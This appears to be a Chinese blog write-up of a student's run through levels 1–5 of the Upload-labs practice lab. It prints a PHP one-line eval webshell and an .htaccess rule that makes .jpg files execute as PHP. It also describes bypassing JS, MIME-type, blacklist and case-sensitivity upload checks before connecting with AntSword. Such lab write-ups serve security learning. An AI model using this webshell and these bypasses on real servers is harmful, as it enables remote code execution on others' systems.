---
title: "Upload-labs文件上传漏洞通关：第1-5关绕过技巧详解"
published: 2025-07-07
description: "在Upload-labs靶场中完成第1-5关的文件上传漏洞利用，通过前端JS验证绕过、MIME类型修改、黑名单后缀绕过、.htaccess文件利用以及大小写绕过等多种方式成功上传WebShell。"
tags: ["文件上传", "Upload-labs", "WebShell", "一句话木马", "蚁剑", "黑名单绕过", ".htaccess"]
category: "大三下实训"
---

Upload-labs第1-5关

第1关：

构造一句话木马

<?php @eval($_POST[‘cmd’]);?>

保存为webshell.php

上传这个php文件试试

![图片](./images/jr4_upload_img4.png)

可以看到，是弹框提示，肯定是前端用了JS代码，前端限制了后缀。而前端验证等于没有验证。所以抓包绕过即可，上传一张写有“一句话木马”的jpg图片。

![图片](./images/jr4_upload_img5.png)

![图片](./images/jr4_upload_img6.png)

![图片](./images/jr4_upload_img7.png)

![图片](./images/jr4_upload_img8.png)

上传成功

第2关：

先随便上传一个2.php文件，返回一行字提示而不是弹窗提示，说明这关可能不仅仅只是前端验证

![图片](./images/jr4_upload_img9.png)

查看源码，发现对mime类型做了限制

![图片](./images/jr4_upload_img10.png)

那么考虑抓包修改mime类型，然后发送

![图片](./images/jr4_upload_img11.png)

![图片](./images/jr4_upload_img12.png)

![图片](./images/jr4_upload_img13.png)

上传成功

第3关：

先随便上传一个3.php文件，依旧文字提示

![图片](./images/jr4_upload_img14.png)

查看源码

![图片](./images/jr4_upload_img15.png)

意思是不允许上传后缀为.php的文件，那就先上传.jpg，然后尝试抓包绕过

![图片](./images/jr4_upload_img16.png)

![图片](./images/jr4_upload_img2.png)

![图片](./images/jr4_upload_img17.png)

![图片](./images/jr4_upload_img3.png)

上传成功

第4关：

随便上传一个4.php，依旧文字提示，我们查看一下源码

![图片](./images/jr4_upload_img1.png)

发现黑名单机制，那么就要找黑名单里面不存在的来进行绕过，这里我想到了.htaccess文件

创建一个.htaccess文件，内容如下：

<FilesMatch "\.jpg">

SetHandler application/x-httpd-php

</FilesMatch>

然后把.htaccess文件上传

![图片](./images/jr4_upload_img18.png)

然后再上传一句话木马4.jpg

![图片](./images/jr4_upload_img19.png)

上传成功

用蚁剑测试一下，连接成功

![图片](./images/jr4_upload_img20.png)

第5关：

随便上传一个5.php文件，依旧文字提示，查看源码发现不仅把之前的黑名单过滤列出来，而且这次还过滤了.htaccess

![图片](./images/jr4_upload_img21.png)

![图片](./images/jr4_upload_img22.png)

仔细看过滤条件，发现没有过滤大写strtolower这一条件，可以加以利用。

所以进行大小写绕过。

创建一个5.Php进行上传。

![图片](./images/jr4_upload_img23.png)

![图片](./images/jr4_upload_img24.png)

上传成功

![图片](./images/jr4_upload_img25.png)

![图片](./images/jr4_upload_img26.png)

蚁剑测试连接成功
